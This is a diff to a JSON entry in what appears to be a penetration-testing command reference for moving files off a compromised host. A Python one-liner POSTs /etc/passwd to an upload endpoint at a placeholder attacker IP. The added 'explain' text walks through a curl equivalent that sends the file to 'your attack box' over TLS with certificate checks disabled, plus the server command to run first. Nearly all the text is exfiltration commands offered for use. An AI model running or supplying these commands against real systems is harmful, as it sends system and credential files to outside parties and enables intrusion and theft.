@@ -129,5 +129,6 @@
       "command": "python3 -c 'import requests;requests.post(\"http://<ip>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
       "label": "python3"
     }
-  ]
+  ],
+  "explain": "Exfiltrates a file to your attack box over an encrypted HTTPS uploadserver:\n  curl -X POST https://<ip>/upload   POST to the uploadserver's upload endpoint\n  -F 'files=@/etc/passwd'            attach the file as multipart form data\n  --insecure                         accept the self-signed cert\nUploads the file over TLS so creds are not sent in cleartext; run 'python3 -m uploadserver 443 --server-certificate' on your side first."
 }
